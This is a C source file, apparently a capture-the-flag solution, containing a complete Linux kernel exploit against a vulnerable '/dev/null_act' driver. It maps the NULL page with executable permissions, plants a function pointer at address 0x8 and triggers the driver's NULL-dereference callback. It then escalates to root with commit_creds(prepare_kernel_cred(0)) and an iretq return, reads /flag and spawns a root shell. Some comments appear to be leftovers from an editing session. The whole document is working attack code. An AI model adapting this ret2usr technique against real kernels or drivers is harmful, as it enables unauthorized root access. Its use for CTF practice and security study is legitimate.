#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

// IOCTL 命令号，从 chall1_null_mod.c 中确认
#define NULL_ACT_ALLOC    0x40001
#define NULL_ACT_CALLBACK 0x40002
#define NULL_ACT_FREE     0x40003 // 未在本exploit中使用
#define NULL_ACT_RESET    0x40004

const char *DEVICE_PATH = "/dev/null_act";
static int device_fd = -1;

/* ============================== Kernel Function Pointers ============================== */
// 这些地址需要从你的目标内核的 /proc/kallsyms 或 System.map 中获取
// 确保 KASLR 是关闭的，或者你有办法泄露内核基址来计算它们
// 以下地址仅为示例，你需要替换成你环境中的实际地址！
#define PREPARE_KERNEL_CRED_ADDR  0xffffffff810845a0UL // 替换为实际地址
#define COMMIT_CREDS_ADDR         0xffffffff81084370UL // 替换为实际地址

typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred_t)(unsigned long cred);
typedef int __attribute__((regparm(3))) (*_commit_creds_t)(unsigned long cred);

_prepare_kernel_cred_t prepare_kernel_cred_ptr = (_prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;
_commit_creds_t commit_creds_ptr = (_commit_creds_t)COMMIT_CREDS_ADDR;

/* ============================== User State for iretq ============================== */
unsigned long user_cs, user_ss, user_rflags, user_sp;

// ***********************************************************************
// **                      在此处添加 run_sh 的前向声明                  **
// ***********************************************************************
void run_sh(void);
// ***********************************************************************

void save_user_state(void) {
    asm volatile(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n" // rsp (stack pointer)
        "pushfq\n"         // push eflags
        "popq %2\n"        // pop into user_rflags
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory"
    );
    printf("[+] User state saved: CS=0x%lx, SS=0x%lx, RSP=0x%lx, RFLAGS=0x%lx\n",
           user_cs, user_ss, user_sp, user_rflags);
}


/* ============================== Privilege Escalation Payload ============================== */
void get_root_privileges(void) {
    commit_creds_ptr(prepare_kernel_cred_ptr(0));

    asm volatile(
        "swapgs;\n"
        "movq %0, %%rsp;\n"
        "pushq %1;\n"
        "pushq %2;\n"
        "pushq %3;\n"
        "pushq %4;\n"
        "pushq %5;\n" // <--- 这里使用 run_sh
        "iretq;\n"
        :
        : "r"(user_sp),
          "r"(user_ss),
          "r"(user_sp),
          "r"(user_rflags),
          "r"(user_cs),
          "r"((unsigned long)run_sh) // %5: 返回到 run_sh 函数
        : "memory"
    );
}

/* ============================== Shell Code / Post-Exploit ============================== */
// run_sh 函数的定义在这里，这是正确的，但声明需要在 get_root_privileges 之前
void run_sh(void) {
    // ... (run_sh 函数的其余部分保持不变) ...
    printf("[+] Returned to user-space with UID: %d, EUID: %d\n", getuid(), geteuid());
    if (getuid() == 0) {
        printf("[+] Successfully got root privileges!\n");

        printf("[+] Reading /flag...\n");
        FILE *f = fopen("/flag", "r");
        if (f) {
            char buf[256];
            while (fgets(buf, sizeof(buf), f)) {
                printf("%s", buf);
            }
            fclose(f);
            if (strchr(buf, '\n') == NULL) {
                printf("\n");
            }
        } else {
            perror("[-] Failed to open /flag");
        }

        printf("[+] Spawning root shell...\n");
        char *args[] = {"/bin/sh", "-i", NULL};
        execve("/bin/sh", args, NULL);
        perror("[-] execve failed");
        exit(EXIT_FAILURE);
    } else {
        fprintf(stderr, "[-] Failed to get root privileges.\n");
        exit(EXIT_FAILURE);
    }
}

// ... (main 函数和 device interaction 函数保持不变) ...
/* ============================== Device Interaction Functions ============================== */
int open_device() {
    if (device_fd >= 0) return device_fd;
    device_fd = open(DEVICE_PATH, O_RDWR);
    if (device_fd < 0) {
        perror("[-] Failed to open /dev/null_act");
        return -1;
    }
    printf("[+] Device /dev/null_act opened (fd: %d).\n", device_fd);
    return device_fd;
}

void close_device() {
    if (device_fd >= 0) {
        close(device_fd);
        device_fd = -1;
    }
}

int do_ioctl_op(unsigned int cmd, const char* cmd_name) {
    if (device_fd < 0) {
        fprintf(stderr, "[-] Device not open for %s.\n", cmd_name);
        return -1;
    }
    printf("[+] Calling ioctl: %s (0x%x)\n", cmd_name, cmd);
    if (ioctl(device_fd, cmd, NULL) < 0) {
        char err_msg[100];
        snprintf(err_msg, sizeof(err_msg), "[-] ioctl %s failed", cmd_name);
        perror(err_msg);
        return -1;
    }
    printf("[+] ioctl %s successful.\n", cmd_name);
    return 0;
}

/* ============================== Main Exploit Logic ============================== */
int main(void) {
    int ret = EXIT_FAILURE;

    printf("[+] Starting exploit for mmap_min_addr=0 scenario...\n");

    save_user_state();

    printf("[+] Mapping NULL page (0x0) with RWE permissions...\n");
    void *null_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    if (null_page == MAP_FAILED || null_page != NULL) {
        perror("[-] mmap NULL page failed");
        if (null_page != MAP_FAILED && null_page != NULL) {
             fprintf(stderr, "    mmap returned %p instead of NULL for MAP_FIXED at address 0.\n", null_page);
             munmap(null_page, 0x1000);
        }
        goto end;
    }
    printf("[+] NULL page mapped successfully at %p.\n", null_page);

    printf("[+] Placing address of get_root_privileges (0x%lx) at 0x8 in NULL page...\n",
           (unsigned long)get_root_privileges);
    *(unsigned long *)(0x8) = (unsigned long)get_root_privileges;
    printf("[+] Value at address 0x8 is now: 0x%lx\n", *(unsigned long *)(0x8));


    if (open_device() < 0) {
        goto cleanup_mmap;
    }

    if (do_ioctl_op(NULL_ACT_ALLOC, "NULL_ACT_ALLOC") != 0) {
        goto cleanup_device;
    }
    if (do_ioctl_op(NULL_ACT_RESET, "NULL_ACT_RESET") != 0) {
        goto cleanup_device;
    }

    printf("[+] Triggering vulnerability by calling NULL_ACT_CALLBACK...\n");
    fflush(stdout);
    ioctl(device_fd, NULL_ACT_CALLBACK, NULL);

    printf("[-] Exploit: After ioctl(CALLBACK). If you see this, iretq might have issues or shell exited.\n");
    ret = EXIT_SUCCESS;

cleanup_device:
    close_device();
cleanup_mmap:
    if (null_page == NULL) {
        munmap(null_page, 0x1000);
        printf("[+] Unmapped NULL page.\n");
    }
end:
    printf("[+] Exploit finished with ret code: %d.\n", ret);
    return ret;
}
